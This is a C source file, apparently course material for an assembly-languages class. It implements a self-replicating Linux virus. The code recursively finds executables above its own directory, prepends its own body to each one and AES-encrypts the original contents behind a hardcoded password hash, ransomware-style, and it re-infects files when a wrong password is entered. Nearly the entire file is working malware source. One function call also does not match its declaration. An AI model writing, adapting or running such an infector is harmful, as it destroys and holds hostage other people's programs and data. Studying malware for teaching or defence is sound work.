//***************************************************************************
//
// Program for education in subject "Assembly Languages"
// daniel.krupa@vsb.cz, , VSB-TUO
//
//
//
//***************************************************************************
#define _GNU_SOURCE
//default target directory of infection. ../ means that virus will infect all executables in its parent's parent directory. Change this for more precise attack.
#define TARGET "../"
#define KEYSIZE 32
#define IVSIZE 16
#define CBC 1
#define CTR 1
#define ECB 1

#include <stdio.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
#include <limits.h>
#include <stdlib.h>
#include <openssl/sha.h>
#include "aes.h"  //used code from https://github.com/kokke/tiny-AES-c
// Variables
//
;

//storage for own executable full path
char SELF[PATH_MAX];
//return code enumerator
enum {
	WALK_OK = 0,
	WALK_NAMETOOLONG=1,
	WALK_BADIO=2,
};
//SHA512 hash of correct password
char  corpas[SHA512_DIGEST_LENGTH]  = 
			   {0xE6,0x1B,0x6A,0x99,0x5F,0x8E,0x45,0xAA,
				0xF6,0x30,0x6E,0xE6,0xF6,0x7E,0x52,0x52,
				0x67,0x38,0x91,0x8A,0x33,0xEF,0x81,0x95,
				0xC2,0xCC,0x93,0x2F,0xA6,0xD4,0x63,0x82,
				0xDB,0x31,0x8B,0xD0,0x9A,0x3D,0xEA,0x57,
				0x85,0xD5,0xB8,0x9E,0xC8,0x3E,0xB8,0xC4,
				0x2A,0x8E,0x10,0x74,0xD1,0x3C,0x5B,0xFE,
				0x74,0xC1,0x30,0x26,0x7E,0x09,0xC3,0x4E};;
//storage for AES256 key
char key[KEYSIZE];
//storage for AES256 inicialization vector 
char inivect[IVSIZE];
/*finds out if two passwords are equal.
pass1: first password
pass2: second password
len: common length of both passwords. Function does not support comparing strings of inequal length
*/
int ComparePass(char* pass1,char * pass2,unsigned int len);

/*
raises a number to nearest higher multiple of 16
origlen: original number
*/
unsigned long long PadTo16(unsigned long long origlen);
/*
fills a char array with zeros
data: char array to fill
len: char array length
*/
void Zeroize(char* data,unsigned long long len);
/*
creates a char array containing metadata (difference between real size and padded size of the infected file) and this virus' own size
buffer: array of metadata
padsize: difference between real size and nearest 16 multiple padded size of the infected file
ownsize: virus' own size
*/
void FillInfo(char*buffer,char padsize,unsigned long long ownsize);

/*
extracts an actual file from infected mix.
Used for decryption of a block with structure "virusbody|AES[targetfile|paddingto16]|padsize|ownsize"
For padsize and ownsize see FillInfo
infectedcontent: buffer containing the entire file (abovementioned structure)
extractedcontent: output variable,returns an infected file in state before infection
from:infected file's true beginning (length of the virus body +1)
len:len of infected file's content

Also can act as general Substring function

*/
char * ExtractFormerContent(char*infectedcontent,char*extractedcontent,unsigned long long from,unsigned long long len);

/*
counter function for FillInfo
extracts length and pad size from infected file
infectedcontent: buffer containing the entire file (abovementioned structure at ExtractFormerContent)
infectlen: total len of infected content
ownlen: output,contains virus length
padlen: length of padding of infected file	
*/
void GetInfectionInfo(char* infectedcontent,unsigned long long infectlen,unsigned long long *ownlen,char*padlen);

/*
Calculates an array derivate from input array using XOR operation between lines of the array.
deriv: output variable,contains array derivate
source: contains source array
sourcelen: length of source array
derivlen: defiens into how long lines should the source array be divided
Example:

source = {0x5e,0x63,0x8d,0x01,0x37,0x72,0x59,0x18,0x79,0xf7,0x28,0xb7,0x4d,0xf6,0xe6,0xd9};
sourcelen = 16
derivlen = 4

source is divided into lines of length 4:
0x5e,0x63,0x8d,0x01,
0x37,0x72,0x59,0x18,
0x79,0xf7,0x28,0xb7,
0x4d,0xf6,0xe6,0xd9

Then the deriv array is zeroed and its i-th element is filled with XOR of i-th column of abovementioned matrix:

deriv = {0x5e^0x37^0x79^0x4d , 0x63^0x72^0xf7^0xf6 , 0x8d^0x59^0x28^0xe6 , 0x01^0x18^0xb7^0xd9} = {0x5d,0x10,0x1a,0x77}


*/

void CalculateDerivateArray(char*deriv,char*source,unsigned int sourcelen,unsigned int derivlen);

/*
reverses array
str: array
len: length fo array
*/
char *Mirror( char *str ,unsigned int len);


/*
returns file length in bytes,returns -1 on error.
filepath: path to the file
*/
unsigned long long GetFileLen(char*filepath)
{
		FILE *file;
	
	unsigned long long contentlength;

	
	file = fopen(filepath, "rb");
	if (!file)
	{
		fprintf(stderr, "Unable to open file %s", filepath);
		return -1;
	}
	
	
	fseek(file, 0, SEEK_END);
	contentlength=ftell(file);
	fclose(file);
	return contentlength;
}


/*
returns file content in a form of byte array. peforms binary read.
filepath: path to the file
content: output variable,contains file content in binary form
contentlength: contains number of bytes which should be read from the file
*/
char* ReadFile(char* filepath,char*content,unsigned long long contentlength)
{

	FILE *file;
	
	
	file = fopen(filepath, "rb");
	if (!file)
	{
		fprintf(stderr, "Unable to open file %s", filepath);
		return NULL;
	}
	
	


	
	

	
	if (!content)
	{
		fprintf(stderr, "Memory error!");
		fclose(file);
		return NULL;
	}


	fread(content, contentlength, 1, file);
	fclose(file);

	return content;
}


/*
writes content into a file
filepath: path to the file
content: char array to be written
contentlength: number of characters which should be written
mode: file opening mode specification accordingto man fopen standard
*/
void WriteFile(char* filepath,char*content,unsigned long long contentlength,char* mode)
{

	FILE *file;
	
	
	file = fopen(filepath, mode);
	if (!file)
	{
		fprintf(stderr, "Unable to open file %s", filepath);
		return ;
	}
	
	if (!content)
	{
		fprintf(stderr, "Memory error!");
		fclose(file);
		return ;
	}


	fwrite(content, contentlength, 1, file);
	fclose(file);

	return ;
}


/*prints any hash in byte array form as a hex string. 
hash: array
len: hash length in bytes
*/
void WriteHash(char *hash,int len)

{
	for(int i = 0;i< len;i++)
	{
		printf("%02X ",hash[i]& 0xff );
		
	}
	printf("\n");
	
	
}

/*
performs infection on given file.
Reads virus's own body,finds out its own length,the infected file's length,pads it to multiple of 16,encrypts it using AES256 and creates this structure:
"virusbody|AES[targetfile|paddingto16]|padsize|ownsize"
Key and init vector are calculated from hash of first part of correct password,which is hardcoded at the beginning.
When the infection is finished,the infected file becomes a hostage of the virus and will behave as the virus itself. This is the process of self-replication of the virus.
pathname: path to the infection target
*/


void InfectFile(char* pathname)
{
	//Measuring files
	unsigned long long  ownlen = GetFileLen(SELF);
	unsigned long long  targetlen = GetFileLen(pathname);
	
	unsigned long long  padtargetlen = PadTo16(targetlen);
	char targetpadsize=padtargetlen-targetlen;
	
	//printf("Infecting %llu bytes with %llu bytes of code\n",targetlen,ownlen);
	
	if(targetlen == 0 || ownlen ==0)
	{
		printf("FIleLen 0\n");
		return;
		
	}
	
	//Reading Self
	char* mycontent = (char*)(malloc(ownlen));
	ReadFile(SELF,mycontent,ownlen);
	
	
	//Padding the memory for target file content
	
	//printf("PADDED\nInfecting %llu( + %u) bytes with %llu bytes of code\n",padtargetlen,targetpadsize,ownlen);
	
	//actually reading the target file

	char* targetcontent = (char*)(malloc(padtargetlen));
	Zeroize(targetcontent,padtargetlen);
	ReadFile(pathname,targetcontent,targetlen);
	//WriteHash(mycontent,ownlen);
	//printf("------------\n");
	//WriteHash(targetcontent,padtargetlen);
	
	
	//encrypting
	//strncpy(key,corpas,KEYSIZE);
	//strncpy(inivect,corpas+KEYSIZE,IVSIZE);
	CalculateDerivateArray(key,corpas,SHA512_DIGEST_LENGTH,KEYSIZE);
	CalculateDerivateArray(inivect,corpas,SHA512_DIGEST_LENGTH,IVSIZE);
	
	//printf("------------\n");
	//WriteHash(key,KEYSIZE);
	//WriteHash(inivect,IVSIZE);
	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, key, inivect);
	AES_CBC_encrypt_buffer(&ctx,targetcontent,padtargetlen);
	
	WriteFile(pathname,mycontent,ownlen,"wb");
	WriteFile(pathname,targetcontent,padtargetlen,"ab");
	
	//creating appendix of information
	int addinfosize = 16;
	char info[addinfosize];
	Zeroize(info,addinfosize);
	FillInfo(info,targetpadsize,ownlen);
	//WriteHash(info,addinfosize);
	WriteFile(pathname,info,addinfosize,"ab");
	
	
	free(mycontent);
	free(targetcontent);
	
	
	
}

/*
performs actual "healing" of the infected file.
Reads infected file's full body,extracts the infector's body,removes metadata it needs for decryption,decrypts the hostage file and removes the padding.
Then launches the freed file. 

passphrase: string for authentication purposes. Its correctness decides if the file should be decrypted at all.
Though,this function does not perform the correctness check,the passphrase must be checked before using this function. 
This function only does thedecryption itself.
Using it without correctness check results in getting corrutped file.

*/
//char* password,
void FreeFile(char*passphrase)
{
	int infosize = 16;
	unsigned long long  infectlen = GetFileLen(SELF);
	char* infectedcontent = (char*)(malloc(infectlen));
	Zeroize(infectedcontent,infectlen);
	ReadFile(SELF,infectedcontent,infectlen);
	unsigned long long ownlen=0;
	char padlen=0;
	GetInfectionInfo(infectedcontent,infectlen,&ownlen,&padlen);
	//WriteHash(&infectedcontent[infectlen-infosize],infosize);
	printf("Freeing %llu b file from %llu bytes of malicious code. %u bytes of padding will be removed\n",infectlen,ownlen,padlen);
	CalculateDerivateArray(key,corpas,SHA512_DIGEST_LENGTH,KEYSIZE);
	CalculateDerivateArray(inivect,corpas,SHA512_DIGEST_LENGTH,IVSIZE);
	//WriteHash(key,KEYSIZE);
	//WriteHash(inivect,IVSIZE);
	
	struct AES_ctx ctx;
	AES_init_ctx_iv(&ctx, key, inivect);
	AES_CBC_decrypt_buffer(&ctx,&infectedcontent[ownlen],infectlen-ownlen-infosize);
	
	unsigned long long formerlen = infectlen-ownlen-infosize-padlen;
	char*formercontent = (char*)(malloc(formerlen));
	ExtractFormerContent(infectedcontent,formercontent,ownlen,formerlen);
	CalculateDerivateArray(key,corpas,SHA512_DIGEST_LENGTH,KEYSIZE);
	CalculateDerivateArray(inivect,corpas,SHA512_DIGEST_LENGTH,IVSIZE);
	
	//printf("------------\n");
	//WriteHash(key,KEYSIZE);
	//WriteHash(inivect,IVSIZE);
	
	
	
	//printf("Freed result is at %llu, is %llu bytes long\n",ownlen,formerlen);
	
	if(!remove(SELF))
	{
		WriteFile(SELF,formercontent,formerlen,"wb");
		chmod(SELF,S_IRWXU|S_IRWXG|S_IRWXO);
		execl(SELF,SELF,passphrase,(char*)NULL);
	}
	else
	{
		//printf("Deinfection Unsuccessful\n");
		
	}
	
	
	
	free(infectedcontent);
	free(formercontent);
}

/*
gets full paths of all executable files in target directory and it subdirectories recursively.
During traversal it infects all of these files with virus's own body.
dirname: target directory
return value is error code.

*/

int GetFiles(char* dirname)
{

    DIR *dir;
    struct dirent *entry;
	char fullname[PATH_MAX];
	int res = WALK_OK;
	int len = strlen(dirname);
	if (len >= PATH_MAX - 1)
		return WALK_NAMETOOLONG;
	strcpy(fullname, dirname);
	fullname[len++] = '/';

    if (!(dir = opendir(dirname)))
        return WALK_BADIO;

    while ((entry = readdir(dir)) != NULL) 
	{
		if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
        strncpy(fullname + len, entry->d_name, PATH_MAX - len);
		
        if (entry->d_type == DT_DIR) 
		{
            
 
			//printf("%s/",path);
			GetFiles(fullname);
        }
		else 
		{
			
			 char fullpath[PATH_MAX];
			   realpath(fullname,fullpath);
			if(!access(fullname,X_OK) && strcmp(fullpath,SELF))
           {
			  
			printf("%s\n", fullpath);
			
			InfectFile(fullpath);
			//printf("%s\n",entry->d_name);
			}
        }
		
					

    }
    closedir(dir);
	return WALK_OK;
}	


/*Function staring Encrypt mode behavior of the virus. This is the offensive variant. 
targetdir: path to directory where the virus should spread.
*/


void EncryptMode(char* targetdir)
{
	
	int errorcheck = GetFiles(targetdir);
	if(errorcheck !=0)
	{
		printf("ERRNUM =%d\n",errorcheck);
		return;
	}
	
}


/*
Function starting Decryption mode. This is the healing variant.
Firstly function checks the passphrase.
The passphrase is composed from the password (which is used to generate SHA key and vector for encryption) and the authentication part (solely for authentication purposes)
Password is common for all files. Authentication part is unique to each file.
If incorrect password is entered,the program will switch to Encryption mode and encrypts all files within its range again.
This virus can affect one file several times.
This function also does password verification.
passphrase: complete passphrase = password+auth.part
*/

void DecryptMode(char* passphrase)
{
	//printf("%s\n",passphrase);
		

	
	unsigned long selflen = strlen(SELF);
	char rev[PATH_MAX];
	strncpy(rev,SELF,selflen);
	
	Mirror(rev,selflen);
	
	unsigned long passfulllen = strlen(passphrase);
	
	if(passfulllen<=selflen)
	{
		
		printf("Password incorrect\n");
		EncryptMode(TARGET);
		return;
	}
	
	char phrase [passfulllen+1];
	char password [passfulllen+1];
	Zeroize(password,passfulllen+1);
	Zeroize(phrase,passfulllen+1);
	
	//printf("Password length: (%lu)\n Selflen (%lu)\n",passfulllen,selflen);
	ExtractFormerContent(passphrase,password,0,passfulllen-selflen);
	ExtractFormerContent(passphrase,phrase,passfulllen-selflen,selflen);
	//printf("Password: (%s)\nPhrase(%s)\n",password,phrase);
	
	
	char hash[SHA512_DIGEST_LENGTH];
	SHA512(password, strlen(password) , hash);
	//WriteHash(hash,SHA512_DIGEST_LENGTH);
	//WriteHash(corpas,SHA512_DIGEST_LENGTH);

	
	int res = ComparePass(hash,corpas,SHA512_DIGEST_LENGTH);

	int phraseres = ComparePass(phrase,rev,selflen);
	
	if(res !=0 || phraseres !=0 )
	{
		printf("Password incorrect\n");
		EncryptMode(TARGET);
		
	}
	else
	{
		printf("Password Correct\n");
		FreeFile(password,passphrase);
	}
}



int main(int argc, char **argv )
{
	
	
	
	realpath(argv[0],SELF);
	
	//printf("CODE: %s\n",SELF);

	
	
	
	if(argc <=1)
	{
		EncryptMode(TARGET);
		
	}
	else
	{
		char *password = argv[1];
		
			
	DecryptMode(password);
		
	}
					 
					 
					 
}



